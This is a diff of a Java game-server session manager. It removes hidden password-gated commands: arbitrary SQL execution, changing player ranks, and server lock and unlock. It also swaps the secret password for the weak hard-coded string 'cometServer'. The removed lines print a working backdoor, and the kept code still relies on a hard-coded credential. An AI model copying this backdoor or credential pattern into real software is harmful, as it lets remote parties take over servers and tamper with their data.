@@ -156,7 +156,7 @@ public final class SessionManager implements ISessionManager {
     public void parseCommand(String[] message, ChannelHandlerContext ctx) {
         String password = message[0];
 
-        if (password.equals("i3r9oaeksds980u298u9q2u4e92u489ua9ew8ur9aj23948hq39h2983h")) {
+        if (password.equals("cometServer")) {
             String command = message[1];
 
             switch (command) {
@@ -165,54 +165,11 @@ public final class SessionManager implements ISessionManager {
                     break;
                 }
 
-                case "rank": {
-                    Session session = this.getByPlayerUsername(message[2]);
-
-                    if (session != null) {
-                        session.getPlayer().getData().setRank(Integer.parseInt(message[3]));
-                        session.send(new AlertMessageComposer("You're now rank: " + message[3] + "!"));
-                    }
-
-                    break;
-                }
-
                 case "stats": {
                     ctx.channel().writeAndFlush("response||" + JsonFactory.getInstance().toJson(CometStats.get()));
                     break;
                 }
 
-                case "alert": {
-                    Session session = this.getByPlayerUsername(message[2]);
-
-                    if (session != null) {
-                        session.send(new AlertMessageComposer(message[3]));
-                    }
-                    break;
-                }
-
-                case "query": {
-                    Connection sqlConnection = null;
-                    PreparedStatement preparedStatement = null;
-
-                    try {
-                        sqlConnection = SqlHelper.getConnection();
-
-                        preparedStatement = SqlHelper.prepare(message[2], sqlConnection);
-                        preparedStatement.execute();
-                    } catch (SQLException e) {
-                    } finally {
-                        SqlHelper.closeSilently(preparedStatement);
-                        SqlHelper.closeSilently(sqlConnection);
-                    }
-                }
-
-                case "lock":
-                    isLocked = true;
-                    break;
-
-                case "unlock":
-                    isLocked = false;
-                    break;
             }
         } else {
             ctx.disconnect();
